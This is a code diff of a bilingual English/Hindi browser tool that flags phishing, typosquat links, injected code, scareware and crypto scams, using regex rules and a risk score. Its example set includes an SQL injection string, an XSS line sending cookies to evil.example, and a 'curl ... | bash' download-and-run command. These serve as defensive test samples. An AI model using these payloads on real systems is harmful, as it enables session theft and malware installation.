+    crypto: "क्रिप्टो और वित्तीय स्कैम",
+  }
+};
+const CAT_ORDER = ["phishing","url","code","malware","crypto"];
+const CAT_PHRASES = {
+  en: {
+    phishing: "uses pressure tactics or asks for sensitive info — classic phishing moves",
+    url: "links to a site disguised to look like one you trust",
+    code: "contains code built to manipulate a database, browser, or system",
+    malware: "tries to panic you into installing or disabling something",
+    crypto: "makes a financial promise no real offer would make",
+  },
+  hi: {
+    phishing: "दबाव बनाने वाली भाषा या संवेदनशील जानकारी माँगता है — फ़िशिंग की आम तरकीब",
+    url: "एक ऐसी साइट से जोड़ता है जो भरोसेमंद दिखने के लिए भेस बदले हुए है",
+    code: "ऐसा कोड है जो डेटाबेस, ब्राउज़र या सिस्टम में छेड़छाड़ के लिए बनाया गया है",
+    malware: "आपको डराकर कुछ इंस्टॉल या बंद करवाने की कोशिश करता है",
+    crypto: "ऐसा वित्तीय वादा करता है जो कोई असली ऑफ़र कभी नहीं करेगा",
+  }
+};
+
+function applyLanguage(lang){
+  currentLang = lang;
+  document.body.classList.toggle('lang-hi', lang === 'hi');
+  document.documentElement.lang = lang;
+
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if(STRINGS[lang][key] !== undefined) el.innerHTML = STRINGS[lang][key];
+  });
+  document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+    const key = el.getAttribute('data-i18n-placeholder');
+    if(STRINGS[lang][key] !== undefined) el.placeholder = STRINGS[lang][key];
+  });
+  document.querySelectorAll('[data-i18n-aria]').forEach(el => {
+    const key = el.getAttribute('data-i18n-aria');
+    if(STRINGS[lang][key] !== undefined) el.setAttribute('aria-label', STRINGS[lang][key]);
+  });
+  document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.dataset.lang === lang));
+
+  const mode = document.querySelector('.mode-tab.active')?.dataset.mode || 'auto';
+  setMode(mode);
+
+  if(lastState){
+    renderVerdictArea(lastState, false);
+  }
+}
+
+document.getElementById('lang-toggle').addEventListener('click', (e) => {
+  const btn = e.target.closest('.lang-btn');
+  if(!btn || btn.classList.contains('active')) return;
+  applyLanguage(btn.dataset.lang);
+});
+
+/* ==========================================================================
+   Detection rules — keyed, with per-language label/description.
+   ========================================================================== */
+const RULES = [
+  {key:'acct_suspend', cat:'phishing', sev:'high', re:/\b(suspend(ed)?|clos(e|ure)|terminat(e|ed))\b.{0,40}\b(account|access)\b/i,
+    en:{label:"Account suspension / closure threat", desc:"Threatens account suspension or closure — classic urgency pressure to short-circuit careful thinking."},
+    hi:{label:"खाता निलंबन / बंद करने की धमकी", desc:"खाते को निलंबित या बंद करने की धमकी देता है — सोच-समझकर फ़ैसला लेने से रोकने वाली एक आम तरकीब।"}},
+  {key:'urgency', cat:'phishing', sev:'high', re:/\b(within\s+\d+\s*(hours?|hrs?|days?)|act\s+now|immediately|urgent(ly)?)\b/i,
+    en:{label:"Urgency / time-pressure language", desc:"Artificial time pressure. Legitimate institutions rarely demand split-second action."},
+    hi:{label:"जल्दबाज़ी / समय-दबाव वाली भाषा", desc:"बनावटी समय-दबाव। असली संस्थाएँ शायद ही कभी तुरंत कार्रवाई की माँग करती हैं।"}},
+  {key:'generic_greeting', cat:'phishing', sev:'med', re:/\bdear\s+(customer|user|member|valued)\b/i,
+    en:{label:"Generic greeting", desc:"Generic greeting instead of your actual name — a sign of a mass-sent message, not a personal one from your real provider."},
+    hi:{label:"सामान्य अभिवादन", desc:"आपके असली नाम की जगह सामान्य अभिवादन — यह किसी सामूहिक रूप से भेजे गए संदेश का संकेत है, आपकी असली सेवा प्रदाता की व्यक्तिगत चिट्ठी का नहीं।"}},
+  {key:'cred_request', cat:'phishing', sev:'high', re:/\b(verify|confirm|update)\b.{0,30}\b(password|account details|identity|ssn|social security|card number|pin)\b/i,
+    en:{label:"Credential or sensitive-data request", desc:"Asks you to submit credentials or sensitive data directly — legitimate services don't request this via email link."},
+    hi:{label:"क्रेडेंशियल या संवेदनशील डेटा माँग", desc:"सीधे पासवर्ड या संवेदनशील जानकारी माँगता है — असली सेवाएँ ईमेल लिंक के ज़रिए यह नहीं माँगतीं।"}},
+  {key:'bec_giftcard', cat:'phishing', sev:'med', re:/\bwire\s+transfer|gift\s*cards?\b.{0,30}\b(urgent|now|today|asap)\b/i,
+    en:{label:"Payment / gift-card urgency (BEC)", desc:"Payment request paired with urgency — a common pattern in CEO-fraud / business email compromise."},
+    hi:{label:"भुगतान / गिफ़्ट-कार्ड जल्दबाज़ी (BEC)", desc:"जल्दबाज़ी के साथ भुगतान की माँग — यह CEO-फ्रॉड / बिज़नेस ईमेल फ्रॉड में एक आम पैटर्न है।"}},
+
+  {key:'raw_ip', cat:'url', sev:'high', re:/https?:\/\/(\d{1,3}\.){3}\d{1,3}/i,
+    en:{label:"Raw IP address as host", desc:"Raw IP address used instead of a domain name — hides the actual destination and skips normal domain reputation checks."},
+    hi:{label:"डोमेन की जगह सीधा IP पता", desc:"डोमेन नाम की जगह सीधे IP पते का उपयोग — असली गंतव्य छुपाता है और सामान्य डोमेन-प्रतिष्ठा जाँच को टाल देता है।"}},
+  {key:'punycode', cat:'url', sev:'high', re:/xn--[a-z0-9]+/i,
+    en:{label:"Punycode / homograph encoding", desc:"Punycode encoding — often used to render lookalike characters that visually mimic a trusted domain (a homograph attack)."},
+    hi:{label:"प्यूनीकोड / होमोग्राफ़ एन्कोडिंग", desc:"प्यूनीकोड एन्कोडिंग — अक्सर भरोसेमंद डोमेन जैसे दिखने वाले मिलते-जुलते अक्षर दिखाने के लिए इस्तेमाल होती है।"}},
+  {key:'shortener', cat:'url', sev:'med', re:/\b(bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|ow\.ly)\b/i,
+    en:{label:"URL shortener", desc:"URL shortener — hides the real destination until after you've already clicked."},
+    hi:{label:"URL शॉर्टनर", desc:"URL शॉर्टनर — क्लिक करने तक असली गंतव्य छुपाकर रखता है।"}},
+  {key:'brand_tld', cat:'url', sev:'high', re:/\b(paypa1|paypal|amaz0n|amazon|g00gle|google|micros0ft|microsoft|apple|bank)[\-.][a-z0-9\-]*\.(xyz|top|click|info|support|win|gq)\b/i,
+    en:{label:"Brand name + suspicious TLD", desc:"Brand name combined with an unrelated domain and a cheap, high-abuse TLD — a classic typosquat / lookalike domain."},
+    hi:{label:"ब्रांड नाम + संदिग्ध TLD", desc:"किसी ब्रांड के नाम को असंबंधित डोमेन और सस्ते, दुरुपयोग-प्रवण TLD के साथ जोड़ा गया है — एक क्लासिक नकली डोमेन।"}},
+  {key:'subdomain_chain', cat:'url', sev:'med', re:/(?:[a-z0-9\-]+\.){4,}[a-z]{2,}/i,
+    en:{label:"Excessive subdomain chaining", desc:"Excessive subdomain chaining — sometimes used to bury the real domain deep in the URL where it's easy to miss."},
+    hi:{label:"अत्यधिक सबडोमेन चेनिंग", desc:"बहुत सारे सबडोमेन जोड़े गए हैं — कभी-कभी असली डोमेन को URL में गहराई में छुपाने के लिए इस्तेमाल होता है।"}},
+  {key:'typosquat', cat:'url', sev:'high', re:null,
+    en:{label:"Typosquat domain (lookalike of a known brand)", desc:""},
+    hi:{label:"टाइपोस्क्वैट डोमेन (जाने-पहचाने ब्रांड की नकल)", desc:""}},
+
+  {key:'sql_tautology', cat:'code', sev:'high', re:/\bOR\s+['"]?1['"]?\s*=\s*['"]?1['"]?/i,
+    en:{label:"SQL tautology (OR 1=1)", desc:"Classic SQL injection tautology — makes a WHERE clause always evaluate true, bypassing authentication logic."},
+    hi:{label:"SQL टॉटोलॉजी (OR 1=1)", desc:"क्लासिक SQL इंजेक्शन टॉटोलॉजी — WHERE क्लॉज़ को हमेशा सही बना देती है, जिससे लॉगिन जाँच बायपास हो जाती है।"}},
+  {key:'sql_union', cat:'code', sev:'high', re:/\bUNION\s+SELECT\b/i,
+    en:{label:"SQL UNION SELECT", desc:"SQL UNION-based injection — used to pull extra data out of a database via a manipulated query."},
+    hi:{label:"SQL UNION SELECT", desc:"SQL UNION-आधारित इंजेक्शन — छेड़छाड़ किए गए क्वेरी के ज़रिए डेटाबेस से अतिरिक्त डेटा निकालने के लिए इस्तेमाल होता है।"}},
+  {key:'sql_comment', cat:'code', sev:'med', re:/--\s*$/m,
+    en:{label:"SQL comment terminator", desc:"SQL comment terminator — used to cut off the rest of a legitimate query after an injected clause."},
+    hi:{label:"SQL कमेंट टर्मिनेटर", desc:"SQL कमेंट टर्मिनेटर — इंजेक्ट किए गए हिस्से के बाद बाकी असली क्वेरी को काटने के लिए इस्तेमाल होता है।"}},
+  {key:'script_tag', cat:'code', sev:'high', re:/<script[\s>]/i,
+    en:{label:"Inline <script> tag", desc:"Inline <script> tag — the core building block of a cross-site scripting (XSS) payload."},
+    hi:{label:"इनलाइन <script> टैग", desc:"इनलाइन <script> टैग — क्रॉस-साइट स्क्रिप्टिंग (XSS) पेलोड की मुख्य बुनियाद।"}},
+  {key:'doc_cookie', cat:'code', sev:'high', re:/document\.cookie/i,
+    en:{label:"document.cookie access", desc:"Reads the browser's cookies — commonly used in XSS payloads to steal session tokens."},
+    hi:{label:"document.cookie एक्सेस", desc:"ब्राउज़र की कुकीज़ पढ़ता है — XSS पेलोड में सेशन टोकन चुराने के लिए आम तौर पर इस्तेमाल होता है।"}},
+  {key:'download_execute', cat:'code', sev:'high', re:/curl\s+.+\|\s*bash|wget\s+.+&&\s*chmod/i,
+    en:{label:"Download-and-execute pattern", desc:"Download-and-execute pattern — fetches a remote script and runs it immediately, a hallmark of malware droppers."},
+    hi:{label:"डाउनलोड-और-चलाओ पैटर्न", desc:"रिमोट स्क्रिप्ट डाउनलोड करके तुरंत चला देता है — मैलवेयर ड्रॉपर की पहचान।"}},
+  {key:'inline_event', cat:'code', sev:'med', re:/on(error|load|click)\s*=/i,
+    en:{label:"Inline event-handler attribute", desc:"Inline event-handler attribute — a common vector for smuggling script execution into HTML that looks otherwise harmless."},
+    hi:{label:"इनलाइन इवेंट-हैंडलर एट्रिब्यूट", desc:"इनलाइन इवेंट-हैंडलर — निर्दोष दिखने वाले HTML में स्क्रिप्ट छुपाने का एक आम तरीका।"}},
+  {key:'base64_eval', cat:'code', sev:'med', re:/eval\s*\(\s*(atob|base64_decode)/i,
+    en:{label:"Base64 decode-and-execute", desc:"Decodes a base64 blob and immediately executes it — a common way to hide a malicious payload from casual reading."},
+    hi:{label:"Base64 डिकोड-और-चलाओ", desc:"base64 डेटा को डिकोड करके तुरंत चला देता है — सरसरी निगाह से मैलिशियस कोड छुपाने का आम तरीका।"}},
+  {key:'path_traversal', cat:'code', sev:'med', re:/(\.\.\/){2,}/,
+    en:{label:"Path traversal sequence", desc:"Path traversal sequence — attempts to escape a web root or restricted folder to reach files like system configs or credentials."},
+    hi:{label:"पाथ ट्रैवर्सल सीक्वेंस", desc:"पाथ ट्रैवर्सल — प्रतिबंधित फ़ोल्डर से बाहर निकलकर सिस्टम फ़ाइलों या क्रेडेंशियल तक पहुँचने की कोशिश।"}},
+
+  {key:'fake_infection', cat:'malware', sev:'high', re:/your (computer|device|pc) (is|has been) (infected|compromised|hacked)/i,
+    en:{label:"Fake infection alert", desc:"Scareware language claiming your device is infected — designed to panic you into calling a number or installing 'cleanup' software that is itself malicious."},
+    hi:{label:"नकली संक्रमण चेतावनी", desc:"आपके डिवाइस के संक्रमित होने का दावा — किसी नंबर पर कॉल कराने या मैलिशियस 'क्लीनअप' सॉफ़्टवेयर इंस्टॉल कराने के लिए घबराहट पैदा करता है।"}},
+  {key:'call_number', cat:'malware', sev:'med', re:/call\s+(this\s+number|us)\s+immediately|toll[- ]free\s+support/i,
+    en:{label:"Push to call a phone number", desc:"Pushes you toward a phone number instead of an official support channel — a staple of fake tech-support scams."},
+    hi:{label:"फ़ोन नंबर पर कॉल करने का दबाव", desc:"आधिकारिक सपोर्ट चैनल के बजाय किसी फ़ोन नंबर पर कॉल करने के लिए धकेलता है — नकली टेक-सपोर्ट स्कैम की पहचान।"}},
+  {key:'double_ext', cat:'malware', sev:'high', re:/double[- ]?extension|\.pdf\.exe|\.docx?\.exe|\.jpg\.exe/i,
+    en:{label:"Double file extension", desc:"Double file extension trick (e.g. invoice.pdf.exe) — disguises an executable as a harmless document or image."},
+    hi:{label:"डबल फ़ाइल एक्सटेंशन", desc:"डबल एक्सटेंशन ट्रिक (जैसे invoice.pdf.exe) — एक्ज़ीक्यूटेबल फ़ाइल को निर्दोष दस्तावेज़ या इमेज जैसा दिखाती है।"}},
+  {key:'disable_av', cat:'malware', sev:'med', re:/disable\s+(your\s+)?(antivirus|windows defender|firewall)/i,
+    en:{label:"Disable antivirus / firewall instruction", desc:"Instructs the target to turn off security software — a strong signal the next step is installing something malicious."},
+    hi:{label:"एंटीवायरस / फ़ायरवॉल बंद करने का निर्देश", desc:"सुरक्षा सॉफ़्टवेयर बंद करने को कहता है — यह मज़बूत संकेत है कि अगला कदम कुछ मैलिशियस इंस्टॉल करना है।"}},
+
+  {key:'send_receive', cat:'crypto', sev:'high', re:/send\s+.{0,15}(btc|bitcoin|eth|crypto|usdt)\b.{0,40}\b(receive|get back|double)\b/i,
+    en:{label:"Send-to-receive-more crypto scheme", desc:"'Send crypto to receive more back' — a textbook advance-fee crypto scam with no legitimate equivalent."},
+    hi:{label:"'भेजो और ज़्यादा पाओ' क्रिप्टो स्कीम", desc:"'क्रिप्टो भेजो और ज़्यादा वापस पाओ' — एक क्लासिक एडवांस-फ़ीस क्रिप्टो स्कैम, जिसका कोई असली विकल्प नहीं है।"}},
+  {key:'guaranteed_returns', cat:'crypto', sev:'med', re:/guaranteed\s+(returns?|profit)|risk[- ]free\s+investment/i,
+    en:{label:"Guaranteed / risk-free returns claim", desc:"Promises guaranteed or risk-free returns — a claim no legitimate investment can honestly make."},
+    hi:{label:"गारंटीड / जोखिम-मुक्त रिटर्न का दावा", desc:"गारंटीड या जोखिम-मुक्त रिटर्न का वादा — ऐसा दावा जो कोई असली निवेश ईमानदारी से नहीं कर सकता।"}},
+  {key:'prize_claim', cat:'crypto', sev:'med', re:/(claim|redeem)\s+your\s+(prize|reward|winnings)/i,
+    en:{label:"Unsolicited prize / reward claim", desc:"Unsolicited prize or reward claim — used to lure victims into paying a 'release fee' or handing over financial details."},
+    hi:{label:"अनचाहा इनाम / पुरस्कार दावा", desc:"बिना माँगे इनाम या पुरस्कार का दावा — पीड़ितों से 'रिलीज़ फ़ीस' वसूलने या वित्तीय जानकारी लेने के लिए इस्तेमाल होता है।"}},
+];
+
+const TYPOSQUAT_RULE = RULES.find(r => r.key === 'typosquat');
+
+const KNOWN_BRAND_DOMAINS = [
+  "google.com","paypal.com","amazon.com","microsoft.com","apple.com",
+  "facebook.com","instagram.com","netflix.com","linkedin.com","github.com",
+  "dropbox.com","bankofamerica.com","chase.com","wellsfargo.com",
+  "outlook.com","yahoo.com","twitter.com"
+];
+
+function levenshtein(a, b){
+  const m = a.length, n = b.length;
+  const dp = Array.from({length: m+1}, () => new Array(n+1).fill(0));
+  for(let i=0;i<=m;i++) dp[i][0] = i;
+  for(let j=0;j<=n;j++) dp[0][j] = j;
+  for(let i=1;i<=m;i++){
+    for(let j=1;j<=n;j++){
+      dp[i][j] = a[i-1] === b[j-1] ? dp[i-1][j-1] : 1 + Math.min(dp[i-1][j-1], dp[i-1][j], dp[i][j-1]);
+    }
+  }
+  return dp[m][n];
+}
+
+function detectTyposquats(text){
+  const domainRe = /\b(?:https?:\/\/)?(?:www\.)?([a-z0-9-]+(?:\.[a-z0-9-]+)+)\b/gi;
+  const found = [];
+  let m;
+  while((m = domainRe.exec(text)) !== null){
+    const fullMatch = m[0];
+    const domain = m[1].toLowerCase();
+    const parts = domain.split('.');
+    const candidate = parts.slice(-2).join('.');
+    if(KNOWN_BRAND_DOMAINS.includes(candidate)) continue;
+    for(const brand of KNOWN_BRAND_DOMAINS){
+      const dist = levenshtein(candidate, brand);
+      if(dist > 0 && dist <= 2 && Math.abs(candidate.length - brand.length) <= 2){
+        const desc = currentLang === 'hi'
+          ? `"${candidate}" असली "${brand}" से केवल ${dist} अक्षर अलग है — यह एक क्लासिक टाइपोस्क्वैट है जो गलती से टाइप किए गए यूआरएल या सरसरी निगाह को फँसाने के लिए बनाया गया है।`
+          : `"${candidate}" is only ${dist} character${dist>1?'s':''} different from the real "${brand}" — a classic typosquat built to catch mistyped URLs or a quick glance.`;
+        found.push({
+          start: m.index, end: m.index + fullMatch.length, text: fullMatch,
+          key:'typosquat', cat: "url", sev: "high",
+          label: TYPOSQUAT_RULE[currentLang].label,
+          desc
+        });
+        break;
+      }
+    }
+  }
+  return found;
+}
+
+function analyze(text){
+  let matches = [];
+  RULES.forEach(rule => {
+    if(!rule.re) return;
+    const source = rule.re.source;
+    const flags = rule.re.flags.includes('g') ? rule.re.flags : rule.re.flags + 'g';
+    const re = new RegExp(source, flags);
+    let m;
+    while((m = re.exec(text)) !== null){
+      matches.push({
+        start:m.index, end:m.index + m[0].length, text:m[0],
+        key:rule.key, cat:rule.cat, sev:rule.sev,
+        label: rule[currentLang].label, desc: rule[currentLang].desc
+      });
+      if(m.index === re.lastIndex) re.lastIndex++;
+    }
+  });
+  matches = matches.concat(detectTyposquats(text));
+
+  matches.sort((a,b) => a.start - b.start || (a.sev==='high'?-1:1));
+  let filtered = [];
+  let lastEnd = -1;
+  matches.forEach(m => {
+    if(m.start >= lastEnd){ filtered.push(m); lastEnd = m.end; }
+  });
+  return filtered;
+}
+
+const ALL_CHECK_KEYS = RULES.map(r => r.key);
+
+function computeRiskScore(matches){
+  if(matches.length === 0) return 0;
+  let score = 0;
+  matches.forEach(m => { score += m.sev === 'high' ? 22 : 11; });
+  const cats = new Set(matches.map(m => m.cat)).size;
+  score += (cats - 1) * 10;
+  return Math.max(4, Math.min(100, Math.round(score)));
+}
+
+function verdictTier(score){
+  if(score === 0) return 'safe';
+  if(score < 50) return 'caution';
+  return 'flagged';
+}
+
+function escapeHtml(s){
+  return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+function buildSummary(matches, aiResult){
+  if(matches.length === 0 && aiResult){
+    return aiResult.reasoning;
+  }
+  if(matches.length === 0){
+    return t('summarySafeNoMatches');
+  }
+  const catCounts = {};
+  matches.forEach(m => { catCounts[m.cat] = (catCounts[m.cat]||0) + 1; });
+  const cats = Object.keys(catCounts);
+  const phrases = CAT_PHRASES[currentLang];
+  const clauses = cats.map(c => phrases[c] || c);
+  let clauseText;
+  if(clauses.length === 1) clauseText = clauses[0];
+  else if(clauses.length === 2) clauseText = clauses[0] + t('joinTwo') + clauses[1];
+  else clauseText = clauses.slice(0,-1).join(", ") + t('joinLast') + clauses[clauses.length-1];
+
+  const highCount = matches.filter(m => m.sev==='high').length;
+  const severityNote = highCount > 0 ? t('highSeverityNote')(highCount, matches.length) : t('modSeverityNote');
+
+  return `${t('summaryPrefix')} ${clauseText}. ${severityNote}`;
+}
+
+function iconForTier(tier){
+  if(tier === 'safe') return ICONS.shieldCheck;
+  if(tier === 'flagged') return ICONS.shieldX;
+  if(tier === 'pending') return ICONS.shieldScan;
+  return ICONS.shieldAlert;
+}
+function labelForTier(tier){
+  if(tier === 'safe') return t('verdictSafe');
+  if(tier === 'flagged') return t('verdictFlagged');
+  if(tier === 'pending') return t('verdictPending');
+  return t('verdictCaution');
+}
+
+function scoreRing(score, tier){
+  const r = 30, c = 2 * Math.PI * r;
+  const pct = score / 100;
+  const colorVar = tier === 'safe' ? 'var(--safe)' : tier === 'flagged' ? 'var(--danger)' : 'var(--caution)';
+  return `
+    <div class="score-ring-block">
+      <svg class="score-ring" width="76" height="76" viewBox="0 0 76 76">
+        <circle class="track" cx="38" cy="38" r="${r}" fill="none" stroke-width="7"/>
+        <circle class="fill" cx="38" cy="38" r="${r}" fill="none" stroke="${colorVar}" stroke-width="7"
+          stroke-dasharray="${c}" stroke-dashoffset="${c}" transform="rotate(-90 38 38)" data-target="${c * (1-pct)}"/>
+      </svg>
+      <div>
+        <div class="score-num" style="color:${colorVar}">${score}/100</div>
+        <div class="score-label">${t('riskScore')}</div>
+      </div>
+    </div>
+  `;
+}
+
+/* ==========================================================================
+   Narration during "pending" state
+   ========================================================================== */
 function typewriter(el, text, speed){
   return new Promise((resolve) => {
     if(window.matchMedia('(prefers-reduced-motion: reduce)').matches){
@@ -1166,390 +1126,35 @@ async function runScanNarration(){
   }
 }
 
-const STRINGS = {
-  en: {
-    title: "AI Red Flag Detector",
-    heroTitle: 'Not sure if it\'s <span class="accent">safe</span>?',
-    subhead: "Paste a message, link, or bit of code below. We'll scan it against known scam patterns and get a second opinion from AI — then explain what we found in plain language.",
-    modeAuto: "Auto detect", modeMessage: "Message / Email", modeUrl: "Link", modeCode: "Code",
-    placeholderAuto: "Paste a suspicious email, link, or code snippet here...",
-    placeholderMessage: "Paste the full email or message text here...",
-    placeholderUrl: "Paste the suspicious link here...",
-    placeholderCode: "Paste the code snippet here...",
-    tryExample: "Or try an example",
-    exPhishing: "📧 Fake shipping email", exUrl: "🔗 Sketchy link", exCode: "💻 Malicious code",
-    exScareware: "☎️ Tech support scam", exCrypto: "💰 Crypto scam", exTyposquat: "🎭 Lookalike domain",
-    analyzeBtn: "Check it",
-    helperNote: "Nothing you paste here is saved — it's only used to run this check.",
-    footer: "Built to help you spot patterns, not replace your judgment.",
-    footerSub: "Always verify important messages directly with the sender or organization.",
-    yourText: "Your text, with flags highlighted",
-    yourTextSub: "Hover a highlight to see why it was flagged",
-    whatWeFound: "What we found",
-    whatWeFoundSub: (n) => n === 1 ? "1 thing worth a closer look" : `${n} things worth a closer look`,
-    nothingFound: "Nothing jumped out here — but that's not a full guarantee. See the AI's take below, and the full checklist for everything we checked.",
-    fullChecklist: "See everything we checked",
-    fullChecklistSub: "Every pattern we scan for, including the ones that didn't fire",
-    aiTake: "AI's second opinion",
-    aiTakeSub: "Looks at intent and context, not just keywords",
-    aiPending: "Reading it over for anything the pattern scan might miss…",
-    aiUnavailable: "Couldn't reach the AI analyst",
-    finalVerdictFallback: "The result above is based on the pattern scan only.",
-    retryAi: "Try again",
-    riskScore: "Risk score",
-    verdictSafe: "Looks safe",
-    verdictCaution: "Worth a second look",
-    verdictFlagged: "Red flag",
-    verdictPending: "Checking it now…",
-    summarySafeNoMatches: "Nothing matched our known red-flag patterns. We're still asking the AI for a second opinion, since some scams are new or don't use obvious keywords.",
-    summaryPrefix: "This looks risky because it",
-    joinTwo: ", and it also ",
-    joinLast: ", and ",
-    highSeverityNote: (h, tt) => `${h} of the ${tt} thing${tt>1?'s we found are':' we found is'} high-severity.`,
-    modSeverityNote: "What we found is moderate on its own, but worth being careful about.",
-    patternScan: "Pattern scan", aiAnalystLabel: "AI",
-    confidenceLabel: "Confidence",
-    catPhrases: {
-      "Social Engineering / Phishing": "uses pressure tactics or asks for sensitive info — classic phishing moves",
-      "Malicious URL Pattern": "links to a site disguised to look like one you trust",
-      "Code Injection (Web/Command)": "contains code built to manipulate a database, browser, or system",
-      "Malware / Scareware": "tries to panic you into installing or disabling something",
-      "Crypto & Financial Scam": "makes a financial promise no real offer would make",
-    }
-  },
-  hi: {
-    title: "AI रेड फ़्लैग डिटेक्टर",
-    heroTitle: 'पक्का नहीं कि यह <span class="accent">सुरक्षित</span> है?',
-    subhead: "नीचे कोई संदेश, लिंक या कोड पेस्ट करें। हम इसे जाने-पहचाने स्कैम पैटर्न से मिलाकर जाँचेंगे और AI से दूसरी राय भी लेंगे — फिर सब कुछ सरल भाषा में समझाएँगे।",
-    modeAuto: "ऑटो डिटेक्ट", modeMessage: "संदेश / ईमेल", modeUrl: "लिंक", modeCode: "कोड",
-    placeholderAuto: "यहाँ संदिग्ध ईमेल, लिंक या कोड स्निपेट पेस्ट करें...",
-    placeholderMessage: "पूरा ईमेल या संदेश यहाँ पेस्ट करें...",
-    placeholderUrl: "संदिग्ध लिंक यहाँ पेस्ट करें...",
-    placeholderCode: "कोड स्निपेट यहाँ पेस्ट करें...",
-    tryExample: "या एक उदाहरण आज़माएँ",
-    exPhishing: "📧 फ़र्ज़ी शिपिंग ईमेल", exUrl: "🔗 संदिग्ध लिंक", exCode: "💻 दुर्भावनापूर्ण कोड",
-    exScareware: "☎️ टेक-सपोर्ट स्कैम", exCrypto: "💰 क्रिप्टो स्कैम", exTyposquat: "🎭 नकली डोमेन",
-    analyzeBtn: "जाँच करें",
-    helperNote: "यहाँ पेस्ट की गई कोई भी चीज़ सेव नहीं होती — इसका उपयोग सिर्फ़ यह जाँच चलाने के लिए होता है।",
-    footer: "यह टूल पैटर्न पहचानने में मदद करता है, आपके फ़ैसले की जगह नहीं लेता।",
-    footerSub: "ज़रूरी संदेशों की पुष्टि हमेशा भेजने वाले या संस्था से सीधे करें।",
-    yourText: "आपका टेक्स्ट, चिन्हित हिस्सों के साथ",
-    yourTextSub: "क्यों चिन्हित किया गया, यह देखने के लिए हाइलाइट पर होवर करें",
-    whatWeFound: "हमें क्या मिला",
-    whatWeFoundSub: (n) => n === 1 ? "1 चीज़ ध्यान देने लायक" : `${n} चीज़ें ध्यान देने लायक`,
-    nothingFound: "यहाँ कुछ भी संदिग्ध नहीं दिखा — लेकिन यह पूरी गारंटी नहीं है। नीचे AI की राय देखें, और हमने जो कुछ भी जाँचा उसकी पूरी सूची भी।",
-    fullChecklist: "हमने जो कुछ भी जाँचा वह देखें",
-    fullChecklistSub: "हर वह पैटर्न जिसकी हम जाँच करते हैं, वे भी जो नहीं मिले",
-    aiTake: "AI की दूसरी राय",
-    aiTakeSub: "सिर्फ़ शब्दों को नहीं, इरादे और संदर्भ को भी देखता है",
-    aiPending: "पैटर्न स्कैन जो चूक सकता है, उसके लिए इसे ध्यान से पढ़ा जा रहा है…",
-    aiUnavailable: "AI विश्लेषक से संपर्क नहीं हो सका",
-    finalVerdictFallback: "ऊपर दिया गया परिणाम केवल पैटर्न स्कैन पर आधारित है।",
-    retryAi: "फिर से कोशिश करें",
-    riskScore: "जोखिम स्कोर",
-    verdictSafe: "सुरक्षित लगता है",
-    verdictCaution: "थोड़ा ध्यान देने लायक",
-    verdictFlagged: "रेड फ़्लैग",
-    verdictPending: "जाँच हो रही है…",
-    summarySafeNoMatches: "हमारे जाने-पहचाने रेड-फ़्लैग पैटर्न से कुछ नहीं मिला। हम फिर भी AI से दूसरी राय ले रहे हैं, क्योंकि कुछ स्कैम नए होते हैं या सीधे शब्दों का इस्तेमाल नहीं करते।",
-    summaryPrefix: "यह जोखिम भरा लगता है क्योंकि यह",
-    joinTwo: ", और यह भी ",
-    joinLast: ", और ",
-    highSeverityNote: (h, tt) => `${tt} में से ${h} चीज़ें उच्च-गंभीरता वाली हैं।`,
-    modSeverityNote: "जो मिला वह अकेले मध्यम स्तर का है, लेकिन सावधानी बरतना ठीक रहेगा।",
-    patternScan: "पैटर्न स्कैन", aiAnalystLabel: "AI",
-    confidenceLabel: "विश्वास स्तर",
-    catPhrases: {
-      "Social Engineering / Phishing": "दबाव बनाने वाली भाषा या संवेदनशील जानकारी माँगता है — फ़िशिंग की आम तरकीब",
-      "Malicious URL Pattern": "एक ऐसी साइट से जोड़ता है जो भरोसेमंद दिखने के लिए भेस बदले हुए है",
-      "Code Injection (Web/Command)": "ऐसा कोड है जो डेटाबेस, ब्राउज़र या सिस्टम में छेड़छाड़ के लिए बनाया गया है",
-      "Malware / Scareware": "आपको डराकर कुछ इंस्टॉल या बंद करवाने की कोशिश करता है",
-      "Crypto & Financial Scam": "ऐसा वित्तीय वादा करता है जो कोई असली ऑफ़र कभी नहीं करेगा",
-    }
-  }
-};
-function t(key){ return STRINGS[currentLang][key]; }
-
-function applyLanguage(lang){
-  currentLang = lang;
-  document.body.classList.toggle('lang-hi', lang === 'hi');
-  document.documentElement.lang = lang;
-
-  document.querySelectorAll('[data-i18n]').forEach(el => {
-    const key = el.getAttribute('data-i18n');
-    if(STRINGS[lang][key] !== undefined) el.innerHTML = STRINGS[lang][key];
-  });
-  document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
-    const key = el.getAttribute('data-i18n-placeholder');
-    if(STRINGS[lang][key] !== undefined) el.placeholder = STRINGS[lang][key];
-  });
-  document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.dataset.lang === lang));
-
-  if(hasResult && lastState){
-    renderVerdictArea(lastState);
-  }
-}
-
-document.getElementById('lang-toggle').addEventListener('click', (e) => {
-  const btn = e.target.closest('.lang-btn');
-  if(!btn) return;
-  applyLanguage(btn.dataset.lang);
-  const mode = document.querySelector('.mode-tab.active')?.dataset.mode || 'auto';
-  setMode(mode);
-});
-
-const EXAMPLES = {
-  phishing: `Dear Customer,
-
-We detected unusual activity on your account. Your access will be suspended within 24 hours unless you verify your identity immediately.
-
-Click here to confirm your password and account details: http://secure-paypal-verify.xyz/login
-
-Failure to act now may result in permanent account closure. This is an urgent matter requiring your immediate attention.
-
-Regards,
-Account Security Team`,
-
-  url: `Hey, can you check the invoice here before EOD?
-http://192.168.44.10.paypa1-secure.xn--80ak6aa92e.top/invoice?id=88231
-Also try this shortened one a colleague sent: http://bit.ly/3xQinv0ice`,
-
-  code: `SELECT * FROM users WHERE username = 'admin' OR '1'='1'; --
-
-<script>document.location='http://evil.example/steal?c='+document.cookie<\/script>
-
-curl http://evil.example/payload.sh | bash && chmod +x payload.sh`,
-
-  scareware: `WARNING: Your computer is infected with 3 viruses!
-
-Windows Defender has detected malware on your device. Call this number immediately: 1-800-555-0199 for toll-free support.
-
-Our technician will ask you to disable your antivirus temporarily to remove the threat. Do not restart your computer.`,
-
-  crypto: `Congratulations! You've been selected in our giveaway. Claim your prize now.
-
